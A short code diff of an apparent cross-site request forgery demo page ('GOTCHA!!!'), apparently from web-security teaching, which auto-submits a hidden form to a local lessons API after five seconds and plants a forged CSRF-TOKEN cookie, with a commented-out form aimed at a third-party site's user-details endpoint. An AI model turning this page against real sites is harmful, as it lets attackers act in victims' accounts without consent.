@@ -9,12 +9,13 @@
 <h1>GOTCHA!!!</h1>
 
 
-<form id="csrf-form" method='POST' action='https://localhost:4200/api/lessons' >
-
+<form id="csrf-form" method='GET' action='https://localhost:4200/api/lessons' >
+<!--<form id="csrf-form" method='POST' action='https://cup.apss.tn.it/mobile/user-details'>-->
 </form>
-
+ <!-- the attacker cannot send custom http header, so the client can send back the CSRT-TOKEN as custom header -->
 <script>
-
+   
+    document.cookie = 'CSRF-TOKEN=12345'
     setTimeout(function() {
         document.getElementById("csrf-form").submit();
     },5000);
